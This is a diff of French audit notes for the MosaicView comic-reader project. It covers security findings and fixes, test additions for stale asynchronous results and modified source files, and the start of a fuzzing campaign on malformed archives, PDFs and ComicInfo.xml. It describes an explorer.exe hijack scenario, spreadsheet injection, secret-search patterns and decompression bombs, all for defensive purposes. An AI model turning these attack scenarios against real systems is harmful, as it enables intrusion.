+| **C-1** | Antérieur à l'audit, sans rapport avec la sécurité. Relevé par l'utilisateur pendant le test manuel de P2-2 : une bibliothèque qui vient d'être créée n'apparaît pas dans les bibliothèques récentes. Cause, lue dans le code et confirmée par l'observation : `add_to_recent_dbs` n'était appelée que par `LibraryWindow._action_open_db`, jamais par `_on_new_db_accepted`. La base n'était retrouvable qu'en allant chercher son fichier `.mvdb`. | Corrigé : `_on_new_db_accepted` l'ajoute aux récentes dès sa création. Validé dans l'application. Pas de test automatique (méthode de la fenêtre Qt). |
+| **C-2** | Antérieur à l'audit, sans rapport avec la sécurité. Relevé au même moment : après la création d'une bibliothèque, le bouton d'export reste masqué alors que le premier scan a rempli le tableau. Cause : le bouton n'est rendu visible que par le chargement d'une base (`_populate_table`, chargement par lots) ; `_on_scan_finished` met à jour le tableau et le nombre de résultats sans s'en occuper, et le tableau d'une base neuve est vide au moment où le bouton est masqué. | Corrigé : `_on_scan_finished` rend le bouton visible selon le nombre de résultats (et le masque si le scan a vidé le tableau). Validé dans l'application. Pas de test automatique (méthode de la fenêtre Qt). |
+| **C-3** | Relevé par la suite de tests, après la correction de P2-1 : le garde-fou de `test_windows_programs.py` prenait pour un lancement de programme tout appel de méthode nommée `run` (`PdfProbe.run("count", …)`, `PdfProbe.run("cover", …)`, `run("unlock", …)`, `run("cover_jpeg", …)`) : 4 faux positifs. | Corrigé : seuls les appels de `subprocess.X` comptent ; l'auto-test vérifie qu'un `probe.run('count', p)` n'est pas signalé. |
+
+## Zones examinées sans problème significatif, fausses pistes écartées
+
+- **Dépendances (vulnérabilités publiques)** : Pillow 12.3.0 contient les correctifs des failles 2026 (PSD, polices, EPS, McIdas ; corrigées en 12.2.0 et 12.3.0), et ces décodeurs sont de toute façon écartés par `restrict_pillow_formats` ; urllib3 2.7.0 contient le correctif de CVE-2026-44431 (en-têtes transmis lors d'une redirection d'origine différente, corrigé en 2.7.0) ; lxml 6.1.3 est postérieur aux correctifs de CVE-2026-41066 (6.1.0) et CVE-2026-49825 (`Cleaner`, 6.1.1 ; `Cleaner` n'est pas utilisé) ; CVE-2026-3029 de PyMuPDF concerne la commande `embedded_get` de son interface en ligne de commande, jamais appelée par MosaicView. Aucune dépendance vulnérable confirmée. **Alertes non confirmées** : avis MuPDF CVE-2026-25556 et CVE-2026-7233 relayés par des agrégateurs sans détail technique ni plage de versions ; non retenus, PyMuPDF restant isolé dans des process séparés.
+- **Outils natifs** : 7-Zip 26.03 et UnRAR 7.23.0, à jour ; seules les commandes de lecture (`l`, `e -so`, `p`) sont utilisées, jamais l'extraction sur disque : les failles d'extraction (liens symboliques, traversée) ne sont pas atteignables ; `-spd` et `--` déjà en place (Audit 6).
+- **Processus externes** : listes d'arguments, jamais `shell=True` ; entrée standard fermée ; `CREATE_NO_WINDOW` ; codes de retour contrôlés (`_list_7z_files`, `_rar_bytes_without_crc`) ; sortie limitée en taille (`_run_and_read`) ; `UnRAR.exe` fixé par chemin absolu (`rarfile.UNRAR_TOOL`) dans l'exe compilé ; process PDF lancés par `multiprocessing` en `spawn` (exe par chemin absolu, canal authentifié). `os.startfile` ne reçoit que des chemins complets (pas de recherche dans le dossier courant).
+- **Arguments de ligne de commande** : `QApplication(sys.argv)` accepte des options de Qt (`-platformpluginpath`…), mais la seule entrée extérieure est `"%1"` de la déclaration « Ouvrir avec », toujours un chemin absolu : non atteignable sans un raccourci forgé, qui pourrait lancer n'importe quoi de lui-même.
+- **Réseau** : `urllib` et `requests` vérifient les certificats (aucun contexte désactivé) ; délais partout (5 s mise à jour, 10 s images, 30 s ComicVine) ; identifiants ComicVine strictement numériques dans les URL ; clé API envoyée seulement à l'hôte fixe ComicVine, en HTTPS ; `urllib` refuse les redirections vers `file://` ; la vérification de mise à jour ne télécharge rien d'exécutable (compare `tag_name` avec `packaging.Version`, ouvre une page fixe). Redirection vers `ftp://` acceptée par `urllib` pour l'import Web : sans conséquence (lecture seule, tailles limitées depuis l'Audit 6, P3-4).
+- **Secrets** : aucun secret dans le code ni l'historique Git (recherche de motifs de clés de 40 caractères hexadécimaux, `api_key`, `password`, `token`) ; clé ComicVine chiffrée par DPAPI (liée au compte Windows), masquée dans les erreurs (`_redact_api_key`) et dans tout le journal (`error_log._redact`, causes chaînées comprises) ; `.mosaicview_config.json` exclu du dépôt.
+- **Fichiers temporaires** : `%TEMP%\MosaicViewTemp` est dans le profil de l'utilisateur (pas de répertoire partagé entre comptes) ; temporaires écrits à côté des fichiers de l'utilisateur par `mkstemp` (`make_temp_path`) ; fichiers ouverts avec l'application par défaut limités à une liste blanche (Audit 6, P0-2) ; `cleanup_stale_mei_dirs` ne supprime un dossier `_MEI*` que s'il peut être renommé — vérifié : un dossier dont un fichier est ouvert est refusé (`WinError 5`), donc un `_MEI` d'une application PyInstaller en cours d'exécution est épargné.
+- **Privilèges** : aucun manifeste d'élévation (PyInstaller, `uac_admin` absent : `asInvoker`) ; seule écriture système : `HKCU\Software\Classes\Applications\MosaicView.exe` (« Ouvrir avec »), commande correctement entre guillemets ; aucun service, aucune tâche planifiée.
+- **Exécution de code dynamique** : aucun `eval`, `exec`, `pickle`, `marshal` ; macros JSON dispatchées par noms connus ; les deux `__import__` portent sur des noms fixes.
+- **Base `.mvdb`** : requêtes paramétrées, noms de colonnes et opérateurs pris dans des listes blanches (`_SEARCHABLE`, `_OP_MAP`, `link` limité à `AND`/`OR`). Une base hostile peut au plus ralentir (vue ou déclencheur coûteux) ; une `.mvdb` reste un fichier de l'utilisateur (Audit 6, P2-3).
+- **Affichages Qt** : `QTextEdit` des métadonnées et du `.nfo` remplis par `setPlainText` ; les autres décodages Qt de données venues d'une page passent d'abord par Pillow puis PNG (`renumbering_qt`, `resize_dialog_qt`), seule la couverture ComicVine faisait exception (P3-1).
+- **Canal d'instance unique** : réservé au compte courant par les droits par défaut du canal nommé ; nom prévisible déjà traité (Audit 6, P4-5, non corrigé par choix).
+- **Journal de numérisation envoyé par mail** : propriétés du scanner, aucune donnée sensible relevée.
+- **Chaîne de livraison** : aucune CI ni action automatisée, donc aucun jeton exposé ; publication manuelle (`RELEASE.txt`) ; fichiers de développement (`idees.txt`, `prompt.txt`, configuration, `.venv`) exclus du dépôt et absents des `.spec`.
+
+## Recoupements avec les audits précédents
+
+- Audit 6, P1-1 et P4-1 (texte externe interprété par Qt) : P4-1 en est la suite pour les fenêtres génériques ; P2-2 applique le même principe à un autre interpréteur (tableur).
+- Audit 6, P1-2 (formats de Pillow) : P3-1 est un chemin qui la contourne.
+- Audit 6, P2-4 (jonctions NTFS) : même erreur de confiance envers un emplacement que l'utilisateur ne maîtrise pas que P2-1.
+- Audit 9, P2-2 (chemins du profil masqués) : P4-2 en est un reste.
+
+## Tests
+
+- **Existants concernés** : `test_comicvine_requests.py` (masquage de la clé, réponses), `test_error_log_capture.py` (secrets masqués dans le journal), `test_pillow_formats.py`, `test_check_plain_text_labels.py`, `test_untrusted_names.py`, `test_7z_member_extraction.py`.
+- **Manquants au rapport initial** : lancement des programmes Windows par chemin complet (P2-1) ; type texte des cellules de l'export Excel (P2-2) ; absence de repli vers Qt pour la couverture (P3-1) ; chemin du journal raccourci dans le mail (P4-2).
+- **Ajoutés** (suite passée de 1477 à 1489 tests) :
+
+| Fichier | Couvre |
+|---|---|
+| `test_windows_programs.py` (nouveau, 6 tests) | P2-1 : chemins complets des programmes de Windows, garde-fou AST des lancements par nom nu, `7z.exe` indépendant du dossier courant |
+| `test_library_excel_export.py` (nouveau, 3 tests) | P2-2 |
+| `test_comicvine_cover_decoding.py` (nouveau, 2 tests) | P3-1 |
+| `test_check_plain_text_labels.py` (1 nouveau) | P4-1 |
+| `test_error_log.py` (test existant complété) | P4-2 |
+
+- **Toujours manquants** : C-1 et C-2 (méthodes de la fenêtre Qt de la Bibliothèque, validées dans l'application seulement) ; P2-1 dans l'application avec un faux `explorer.exe` dans le dossier courant (reproduction faite hors de l'application, sur le mécanisme de `subprocess`).
+
+## Plan de correction (ordre proposé)
+
+1. **P2-1** : fonction commune des chemins de programmes Windows, appliquée aux 8 sites, `_get_7z_exe` (et autres `abspath(".")`) fondés sur `__file__`, garde-fou AST. Aucune dépendance.
+2. **P2-2** : cellules texte dans l'export Excel, fonction testable sans Qt.
+3. **P3-1** : suppression du repli vers Qt ; retrait des plugins `imageformats` inutiles des `.spec` sur accord de l'utilisateur (modification de distribution).
+4. **P4-2** : chemin raccourci dans le mail (une ligne).
+5. **P3-2, P4-3** : décisions de distribution (empreintes publiées, versions figées, provenance des outils natifs), à documenter dans `RELEASE.txt` / README si l'utilisateur les retient.
+6. **P4-1** : `ErrorDialog` en texte brut par défaut, après revue des messages qui contiennent du HTML voulu ; optionnel.
+
+## Corrections restant à faire
+
+Faits : P2-1, P2-2, P3-1, puis P4-2 et P4-1 (fenêtre d'erreur), C-3, puis C-1 et C-2 ; suite complète passée (1489 tests) ; validés dans l'application sauf P4-1 (aucun changement visible), P4-2 et la partie 7z de P2-1 (tests automatiques seulement). Entrées ajoutées à la section [1.10.0] du CHANGELOG (cinq puces « Security » : P2-1, P2-2, P3-1, P4-1, et la partie 7z de P2-1 ; une puce « Error log » : P4-2 ; deux puces « Library » : C-1, C-2 ; titre complété) ; nombre de tests porté à 1489 dans `CLAUDE.md` et `RELEASE.txt` ; section « Sécurité » de `CLAUDE.md` complétée (n° 5 : jamais d'octets bruts confiés à Qt ; n° 6 : programmes lancés par leur chemin complet ; n° 7 : valeurs externes écrites comme données dans un fichier destiné à un autre programme) ; skills mis à jour : `explorer-select` (chemin complet de l'Explorateur, garde-fou), `library` (bases récentes à la création, bouton d'export, cellules texte de l'export Excel), `comicvine-metadata-fetch` (couvertures décodées par Pillow seulement), `config-storage` (chemin raccourci dans le mail du journal). Fichiers de test manuel (CBZ piégés, aucun contenu dangereux) laissés hors du dépôt, dans `C:\tmp\MosaicView_audit11\`.
+
+Non retenus, par choix de l'utilisateur : P3-2 (signature et empreintes des exécutables), P4-3 (versions figées, provenance des outils natifs), retrait des plugins `imageformats` inutiles (P3-1), `InfoDialog` en texte brut (P4-1, liens voulus).
+
+---
+
+# Consolidation des tests — lacunes restantes des audits 4 à 11 (version 1.10.0)
+
+- **Période** : octobre 2026 (dépôt au commit `5455d5b`, version 1.10.0 non publiée).
+- **Objet** : pas un nouvel audit. Reprendre les tests déclarés « toujours manquants » par les audits 4 (asynchronisme), 7 (erreurs et annulations), 8 (cycle de vie des fenêtres), 9 (journal des erreurs), 10 (couverture des tests) et 11 (sécurité), vérifier dans le code actuel s'ils manquent encore, et ajouter ceux qui apportent une garantie utile. Ordre : P0 (perte de données), P1 (mauvais document, état incohérent), P2, P3.
+- **Méthode** : lecture des sections de ces audits, du code concerné et des tests existants avant chaque ajout. Tests sans Qt, sans réseau, sans attente : fonctions et méthodes des modules Qt extraites par `tests/ast_loader.py`, vrai `AppState`, vrais fichiers sur disque ; seuls les workers, l'affichage et les fenêtres sont remplacés. Un résultat « déjà en file d'attente » est rejoué en appelant le slot avec son émetteur (`sender()`) ou les slots captés à l'émission, après l'annulation ou le remplacement : la course de Qt (connexion vérifiée à l'émission, pas à la livraison) devient une séquence déterministe. Aucun outil de couverture n'a été exécuté : aucune couverture mesurée n'est annoncée. Aucun test lancé par Claude (règle de `CLAUDE.md`) ; la suite a été passée par l'utilisateur à chaque étape.
+
+## Résultat
+
+| Niveau | Lacunes examinées | Tests ajoutés | Défaut de production |
+|---|---|---|---|
+| P0 | Source supprimée pendant une conversion par lot (Audits 4 et 10) ; import de métadonnées enregistré après une réécriture du fichier ; source modifiée par un autre programme pendant sa conversion | 7 + 15 | 2, corrigés (C-1, C-2) |
+| P1 | Résultats périmés : ouverture d'archive et de PDF, ajout d'une archive, fusion d'un PDF, vérification des mises à jour ComicVine (Audit 4, P1-2, P1-4, P2-3, C-3) ; confirmations de la Bibliothèque après un changement de base | 30 + 6 | 1, corrigé (C-3) |
+| P2 | Aperçu de la Bibliothèque (Audit 4, P2-2) ; images déposées puis archive ouverte (Audit 4, P2-1) | 8 | — |
+| P3 | Annulations à la fermeture, ajouts différés, arrêt à la sortie | 0 (déjà couverts) | — |
+
+Suite : 1489 tests au début, 1534 après la première série, **1555** à la fin (protection contre une source modifiée, fusion d'un PDF), tous passés. Les nombres de tests comptent les cas d'un test paramétré.
+
+## Tests ajoutés et invariants vérifiés
+
+| Fichier | Tests | Invariant |
+|---|---|---|
+| `test_batch_loops.py` | 6 (CBR et CB7) | Source supprimée par un autre programme entre deux pages, qui écrit au même moment le CBZ visé : le CBZ incomplet du lot ne prend jamais ce nom (fichier de l'autre programme ni remplacé ni supprimé), aucun temporaire, rien à la Corbeille, échec compté et consigné (page en cause nommée) ; le lot passe au fichier suivant et le convertit ; source disparue juste après la relecture du CBZ : CBZ complet gardé, conversion comptée, échec de la suppression signalé. Les faux lecteurs RAR et 7z échouent désormais si l'archive a quitté le disque (comme `rarfile` et 7z, qui la rouvrent à chaque page) |
+| `test_batch_metadata_save.py` | 1 (+1 docstring corrigée) | CBZ réécrit par un autre programme entre le chargement et l'enregistrement de l'import de métadonnées : pages relues au moment d'enregistrer, seul ComicInfo.xml remplacé, couverture lue au chargement jamais réécrite |
+| `test_stale_async_results.py` (nouveau) | 34 | **Ouverture d'une archive** (`ArchiveLoader`) : fin, erreur, annulation, renommage d'extension ou question d'extension d'un chargement remplacé ou annulé jamais appliqués (document, fichier courant, fenêtre, annonce de fin) ; erreur puis annulation du même chargement : une seule fin ; fin livrée deux fois : installée une fois. **Ouverture d'un PDF** (`PdfLoader`) : mêmes cas ; Annuler traité pendant le `processEvents` qui précède le démarrage : worker jamais branché ni démarré, process PDF arrêté (C-3 de l'Audit 4). **Vérification des mises à jour ComicVine** : réponse ou erreur après un changement de document : aucune fenêtre, bouton rendu, worker libéré ; bouton détruit entre-temps : sans exception ; « Tout mettre à jour » après un changement de document : rien d'écrit ; pendant une opération : écrit à sa fin. **Aperçu de la Bibliothèque** : couverture d'une sélection précédente jamais affichée à la place de la courante, ni de « aperçu indisponible », ni après un changement de base. **Ajout d'une archive** (`import_and_merge_archive`) : résultat ou erreur en file d'attente au clic sur Annuler, fin après la fermeture du fichier, document remplacé : rien d'ajouté ; pendant une opération : ajouté à sa fin, abandonné si le document change avant. **Images déposées puis archive ouverte** (`PanelWidget._start_replacing_load`) : chargement d'images arrêté, texte retiré, résultat tardif sans effet, images reprises dans l'archive une fois chargée, abandonnées si elle est fermée ; second dépôt : la fin du premier est ignorée. Chaque groupe a un témoin (le résultat courant est bien appliqué) |
+| `test_batch_loops.py` (suite) | 7 | Source modifiée par un autre programme (C-2) : CBR ou CB7 réécrit entre deux pages, CBT réécrit sur place, PDF réécrit pendant le rendu de ses pages, image réécrite après sa lecture (un CBZ par image, et tout dans un seul CBZ : seules les autres images sont supprimées) → aucun CBZ, ou CBZ gardé sans suppression de la source, source intacte, rien à la Corbeille, échec consigné ; PDF : le process n'est pas relancé (pas une panne du moteur). Source modifiée juste après la relecture du CBZ : CBZ complet gardé, source gardée |
+| `test_converted_cbz.py` | 7 | `delete_source` avec signature : source inchangée → Corbeille ; réécrite ou retirée après la lecture → jamais supprimée, `SourceChangedError` ; erreur attendue (absente du journal des erreurs). Garde-fou AST : chaque conversion appelle `delete_source` avec `source_signature=` (au moins 7 appels), avec son propre test de détection |
+| `test_batch_metadata_save.py` (suite) | 1 | Import de métadonnées d'un CBT réécrit par un autre programme pendant sa conversion : aucun CBZ, CBT gardé |
+| `test_stale_async_results.py` (suite) | 6 | **Fusion d'un PDF** (`import_and_merge_pdf`) : pages ajoutées au comic ; résultat en file d'attente au clic sur Annuler, après la fermeture du fichier, ou pour un document remplacé : rien d'ajouté ; pendant une opération : ajouté à sa fin ; fichier fermé pendant le `processEvents` qui précède le démarrage : process jamais lancé (C-3) |
+| `test_library_deferred_db_actions.py` | 4 | Les vraies suites `_on_delete_accepted` et `_on_rename_accepted`, sur de vraies bases : confirmation demandée pour la base A, base B ouverte avant la réponse → aucune base supprimée ni renommée, B reste ouverte ; témoins pour la base ouverte. Avant, seule `_same_db` était testée, pas son emploi par ces suites |
+
+**Capacité à détecter une régression** (mutation raisonnée, non exécutée) : retirer `if not self._from_current_worker(): return` d'un slot d'`ArchiveLoader`, le contrôle `_current()` d'un slot de `PdfLoader`, le contrôle de génération de `show_comicvine_update_check` ou de `_on_update_clicked`, celui de `self.sender()` dans `_on_preview_ready`, `cancelled_flag` ou la génération dans `import_and_merge_archive`, `_same_db` dans les deux suites de la Bibliothèque, ou `_IncompleteCbz` dans les lots, fait échouer au moins un test (état du document, fichiers sur le disque, fenêtres ouvertes ou annonce de fin vérifiés, jamais la seule absence d'exception). Pour la question d'extension d'`ArchiveLoader`, la fenêtre est remplacée par `None` : l'ouvrir lèverait une exception.
+
+## Défauts de production découverts
+
+### C-1 · Import de métadonnées en lot : la couverture lue au chargement remplaçait celle du fichier
+
+- **Priorité** : P0 (modification faite ailleurs annulée sans avertissement), gravité faible · **Certitude** : Confirmed (code ; révélé en écrivant le test) · **Statut** : Corrigé.
+- **Code** : `batch_metadata_dialog_qt.py` → `_BatchMetadataOrchestrator._save_state_for_file` (branche CBZ), `_load_state_for_file`.
+- **Constat** : le state d'un CBZ contient sa couverture, lue au chargement pour l'afficher dans la fenêtre ComicVine (aucun code ne la modifie : seul ComicInfo.xml l'est). À l'enregistrement, parfois plusieurs minutes plus tard, `_write_non_manifest` écrivait toutes les entrées du state, couverture comprise, et la recopie de l'archive sautait le membre de même nom. Si un autre programme avait réécrit le CBZ entre-temps (les panneaux et les lots en sont empêchés par `batch_claims`), l'ancienne couverture remplaçait la nouvelle, et une couverture retirée revenait.
+- **Correction** : la branche CBZ n'écrit depuis le state que ComicInfo.xml (`_write_xml_only`, comme les autres branches) ; toutes les autres entrées sont recopiées depuis l'archive relue. Les branches de conversion (CBR, CBT, CB7, PDF) n'étaient pas concernées.
+- **Tests** : `test_cbz_rewritten_between_loading_and_saving_keeps_its_new_pages` ; `test_cbz_homonym_members_are_both_kept` inchangé dans son attendu (les deux homonymes recopiés), docstring corrigée. Skill `batch-metadata-import` corrigé (il décrivait la couverture comme « potentiellement modifiée par l'utilisateur »). Une phrase ajoutée à la puce « Batch metadata import » du CHANGELOG.
+
+### C-2 · Lots et import de métadonnées : une source modifiée par un autre programme pendant sa conversion était supprimée
+
+- **Priorité** : P0 (perte de la nouvelle version d'un fichier), très faible probabilité · **Certitude** : Confirmed (code ; scénario reproduit par les tests) · **Statut** : Corrigé.
+- **Code** : `batch_dialogs_qt.py` (lots CBR, CB7, CBT, PDF, un CBZ par image, tout dans un seul CBZ), `batch_metadata_dialog_qt.py` → `_save_state_for_file` (branches de conversion), `converted_cbz.py` → `delete_source`.
+- **Constat** : les pages d'un CBR ou d'un CB7 sont lues une à une, l'archive étant rouverte à chaque page. Si un autre programme la remplaçait pendant la conversion, le CBZ mélangeait les pages des deux versions, se relisait correctement, puis la nouvelle version était supprimée (Corbeille par défaut). Même suppression d'une version plus récente pour les autres sources, réécrites entre leur lecture et la suppression. Contrairement à ce qu'indiquait la première version de cette section, un CBT n'est pas protégé par son ouverture : Python l'ouvre en partageant l'accès en écriture.
+- **Correction** : signature de la source (`utils.file_signature` : date de modification et taille) relevée avant sa lecture ; comparée dans le bloc d'écriture, avant que le CBZ prenne son nom (`converted_cbz.check_source_unchanged` : CBZ incomplet jeté, aucun CBZ), puis par `delete_source(…, source_signature=…)` juste avant la suppression (CBZ complet gardé, source gardée). `SourceChangedError` est une erreur attendue (`expected_error = True`, absente du journal des erreurs) ; son texte, `messages.errors.batch_source_changed`, traduit dans les 46 locales, s'affiche dans le journal du lot. Lot PDF : l'erreur ne fait pas relancer le process PDF.
+- **Limite** : une réécriture qui garde la même taille et la même date de modification à la nanoseconde n'est pas vue.
+- **Tests** : voir le tableau (`test_batch_loops.py`, `test_converted_cbz.py` dont le garde-fou AST, `test_batch_metadata_save.py`). Une modification est simulée par `os.utime` (Windows refuse l'écriture d'un fichier ouvert par le test, pas le changement de date). Puce ajoutée au CHANGELOG ; skill `batch-processing` mis à jour.
+
+### C-3 · Fusion d'un PDF : un fichier fermé pendant le démarrage de la fusion recevait quand même ses pages
+
+- **Priorité** : P1 (pages ajoutées à un autre document), faible probabilité · **Certitude** : Confirmed (code ; révélé en écrivant le test) · **Statut** : Corrigé.
+- **Code** : `pdf_loading_qt.py` → `import_and_merge_pdf`.
+- **Constat** : la génération du document (`state.doc_generation`) était relevée après le `QApplication.processEvents()` qui affiche l'indicateur de progression, et l'annulation à la fermeture n'était inscrite qu'ensuite. Une fermeture du fichier traitée pendant ce `processEvents` passait donc inaperçue : la fusion démarrait et ses pages allaient au document ouvert ensuite dans le panneau.
+- **Correction** : génération relevée avant le `processEvents` ; si elle a changé après, l'indicateur est retiré et la fusion n'est pas lancée.
+- **Tests** : `test_pdf_merge_not_started_when_the_file_is_closed_while_events_are_processed`, et les cinq autres tests de la fusion d'un PDF. Skill `pdf-loading` mis à jour. Puce ajoutée au CHANGELOG.
+
+## Déjà suffisamment couvert (aucun test ajouté)
+
+- Une annulation inscrite qui échoue n'empêche pas les autres à la fermeture du fichier (`test_operation_lifecycle.py::test_failing_cancel_does_not_prevent_the_others`).
+- Un ajout différé en échec n'empêche pas les suivants (`test_operation_running.py::test_failed_addition_does_not_drop_the_next_ones`, Audit 4, P2-6).
+- Arrêt à la sortie de l'application (`aboutToQuit`) : Qt appelle chaque slot séparément, l'échec de l'un n'empêche pas les suivants.
+- Fins de la rotation, du miroir, du redimensionnement, du redressement automatique, de la jointure animée, de la conversion de format (`test_operation_lifecycle.py`, `test_format_conversion_flow.py`) ; chaîne de validation (`test_save_validation_chain.py`) ; enregistrement fermé ou remplacé pendant l'écriture (`test_panel_save_write.py`) — dont le nombre écrit contre attendu de l'Audit 7, P2-2, couvert indirectement.
+- Relecture avant suppression de l'original depuis un panneau ou la Bibliothèque : `converted_cbz.reread_then_delete_source` (`test_converted_cbz.py`) et règle 4 de `test_check_atomic_file_writes.py`.
+- Import de métadonnées : relecture du temporaire avant le nommage, fichier écrit entre-temps sous ce nom jamais supprimé (`test_batch_metadata_save.py`, Audit 10, C-4).
+
+## Scénarios encore non couverts
+
+| Scénario | Risque | Raison |
+|---|---|---|
+| Source réécrite sans changer ni sa taille ni sa date de modification (C-2) | P0, quasi nulle | La signature ne compare que ces deux valeurs ; un hachage complet relirait chaque source une fois de plus |
+| Fins de l'import web et de la numérisation | P1, faible | Fermetures imbriquées avec fenêtres Qt ; contrôle de génération et `run_when_idle` présents, imposés par `test_check_operation_close.py` (présence de la comparaison, pas sa place) |
+| Workers gardés par une fenêtre et parqués à sa fermeture, suites appelées après la fermeture (Audit 8) | P3 | Demande Qt (fenêtres vivantes, mémoire) ; validés dans l'application à l'Audit 8 |
+| Bibliothèque : bases récentes à la création, bouton d'export après le premier scan (Audit 11, C-1, C-2) | P2, faible | Méthodes de fenêtre étroitement liées aux widgets ; validés dans l'application. Aucun test ajouté, en accord avec l'utilisateur |
+| Lancement de MosaicView depuis un dossier qui contient un faux `explorer.exe` (Audit 11, P2-1) | P2 | Seul le mécanisme est testé (`test_windows_programs.py` : chemins complets, indépendants du dossier courant, garde-fou AST des lancements par nom nu, `7z.exe` cherché à côté du code). Un test de bout en bout lancerait le vrai Explorateur ; **ce n'est pas une validation du scénario** |
+## Vérifications manuelles restant nécessaires
+
+1. Lancer `MosaicView.py` (et l'exe) depuis un dossier contenant une copie renommée `explorer.exe` d'un programme sans danger, puis « Ouvrir le dossier des fichiers temporaires » et « Ouvrir dans l'Explorateur » de la Bibliothèque : le vrai Explorateur doit s'ouvrir.
+2. Import de métadonnées en lot sur un CBZ : pendant que la fenêtre ComicVine est ouverte, remplacer sa première page avec un autre programme, puis valider : la nouvelle page doit rester.
+3. Lot CBR → CBZ sur une grosse archive : pendant sa conversion, la remplacer par une autre archive du même nom. L'original (la nouvelle archive) doit rester, aucun CBZ ne doit être créé, et le journal du lot doit afficher le message « modifié par un autre programme pendant sa conversion », dans la langue de l'application.
+4. Les courses de Qt (résultat livré après Annuler) restent non reproductibles à la main ; les tests en couvrent la logique, pas le comportement exact de la boucle d'événements.
+
+`UnRAR.exe` absent de l'installation n'est pas retenu comme risque : il est toujours inclus dans la compilation (décision de l'utilisateur).
+
+## Commandes exécutées et résultats
+
+Toutes par l'utilisateur, `run_tests.py` (suite complète, aucun test sauté permis) :
+
+1. Après les tests P0 et P1 : 1520 passés, 4 en échec — `test_stale_async_results.py`, vérification des mises à jour ComicVine : `TypeError` dans le faux signal du test, qui passait au slot `_cleanup()` l'argument de `finished(dict)`, alors qu'un signal PySide ne passe que les arguments qu'un slot attend. Défaut du test, pas de l'application : faux signal propre à ces tests (`_TruncatingSignal`), `tests/fakes.py` inchangé.
+2. Après correction : **1524 passés**.
+3. Après l'ajout d'une archive et les images déposées : **1534 passés** (147 s).
+4. Après la protection contre une source modifiée (C-2), la fusion d'un PDF (C-3) et les traductions : **1555 passés** (156 s).
+
+Traductions de `messages.errors.batch_source_changed` vérifiées clé par clé dans toutes les langues (skill `verify-translation`) : 7 écarts de vocabulaire corrigés (bulgare, tchèque, slovaque, hongrois, ukrainien : mot des boutons de conversion par lot ; irlandais : « programme » ; sindarin : mot de la conversion), variantes pIqaD et tengwar régénérées, 46 fichiers JSON valides.
+
+Aucun échec intermittent observé sur ces quatre passages ; aucun test ne dépend d'une attente, du réseau ou du hasard.
+
+## Autres fichiers modifiés
+
+`CLAUDE.md` et `RELEASE.txt` (nombre de tests : 1555), `run_tests.py` (résumé de ce que vérifie la suite), `CHANGELOG.md` (C-1, C-2, C-3), `locales/*.json` (C-2), skill `batch-metadata-import` (C-1). À la demande de l'utilisateur, les nouveaux tests sont cités dans les skills des systèmes concernés : `archive-image-loading` (chargement et ajout d'archive, images déposées puis archive ouverte), `pdf-loading`, `comicvine-metadata-fetch` (vérification des mises à jour, piège du faux signal), `library` (aperçu, confirmations sur la base), `batch-processing` (source supprimée pendant un lot, protection contre une source modifiée).
+
+---
+
+# Audit 12 — Fuzzing ciblé : noms, fichiers malformés, PDF, ComicInfo.xml, enchaînements (version 1.10.0)
+
+- **Période** : octobre 2026 (dépôt au commit `2ec230b` au départ, version 1.10.0 non publiée), en trois étapes validées une à une par l'utilisateur.
+- **Objet** : compléter les audits précédents (notamment l'Audit 6, fichiers malformés, et l'Audit 11, sécurité) par du fuzzing : envoyer en grand nombre des entrées abîmées ou piégées aux fonctions qui lisent, transforment, convertissent et écrivent les fichiers de l'utilisateur, pour trouver plantages, blocages, problèmes de mémoire, comportements incohérents et données perdues ou altérées ; corriger les problèmes confirmés, avec un test de régression qui échoue avant la correction et passe après. Priorités : P0 intégrité des données, sortie du dossier de destination ; P1 sécurité et robustesse ; P2 comportement incorrect ; P3 ressources et cas limites.
+- **Méthode** :
+  - **Générateurs écrits pour le projet**, sans dépendance ajoutée (Hypothesis n'est pas installé) ni corpus externe : assemblages de fragments piégés pour les noms ; pour les fichiers, graines de synthèse (images de chaque format et mode, CBZ, EPUB, CBT nu, gzip et bzip2, CB7 créés par le 7z.exe embarqué, RAR 4 « stockés » écrits octet par octet, PDF créés par PyMuPDF, ComicInfo.xml générés), puis mutations aveugles (bits inversés, valeurs limites dans des champs de 2 ou 4 octets, coupes, insertions, duplications) et mutations des champs d'en-tête ZIP (méthode, drapeaux de chiffrement et d'UTF-8, CRC, tailles, positions). Graine aléatoire affichée à chaque campagne ; chaque entrée est numérotée et reproductible.
+  - **Vrais lecteurs, sans Qt** : fonctions des modules qui importent Qt extraites par `tests/ast_loader.py` (lecteurs d'`archive_loader.py`, moteur PDF `_pdf_persistent_process` et `read_pdf_message` de `pdf_loading_qt.py`, boucles et noms des lots de `batch_dialogs_qt.py`), `entries.py`, `image_ops.py`, `comic_info.py`, `converted_cbz.py` importés pour de vrai avec un `utils.py` de remplacement fait de ses vraies fonctions extraites. Mêmes réglages de Pillow qu'au démarrage (limite de pixels, formats restreints). Le moteur PDF tourne dans un process séparé, comme dans l'application.
+  - **Oracle** : invariants vérifiés entrée par entrée (aucune exception ne sort d'une fonction qui doit tout rattraper, taille lue jamais supérieure à la taille annoncée, page jamais omise en silence, fichier écrit relu à l'identique, réécriture d'un ComicInfo.xml relisible et fidèle) ; pour l'export, le vrai disque NTFS (fichiers réellement créés dans un dossier temporaire) ; erreurs que `error_log.is_expected_error` classerait « inattendues » comptées à part (elles iraient dans le journal des erreurs de l'utilisateur).
+  - **Protection de l'ordinateur** : chaque cible de fichiers dans un process de travail placé dans un objet job de Windows (1 Go par process, 7z.exe, UnRAR.exe et moteur PDF compris, tués avec lui) ; blocage au-delà de 20 s (50 s pour une entrée PDF), plantage natif et pic au-delà de 600 Mo détectés, entrée en cause gardée, campagne reprise à l'entrée suivante ; bombes de décompression bornées à 1,5 Go ; tout dans des dossiers temporaires, `APPDATA` redirigé ; aucun fichier de l'utilisateur lu ou écrit.
+  - Aucun test de la suite lancé par Claude (règle de `CLAUDE.md`) : chaque attendu vérifié hors suite, sans Qt, sur le code corrigé puis sur une copie de `HEAD` (`git archive`), où chaque test de régression échoue ; suite passée par l'utilisateur à chaque étape. Aucune couverture mesurée n'est annoncée.
+
+## Résultat
+
+| Niveau | Constats confirmés | Corrigés | Non corrigés |
+|---|---|---|---|
+| P0 | 2 (F-10, R-5 : ComicInfo.xml réécrit illisible) | 2 | — |
+| P1 | 4 (F-1, F-5, F-6, F-7) | 4 | — |
+| P2 | 3 (F-2, F-3, F-8) | 3 | — |
+| P3 | 9 (F-4, F-9, F-11, R-1 à R-4, Q-1, Q-2) | 7 | 2, par décision de l'utilisateur (Q-1, Q-2) |
+
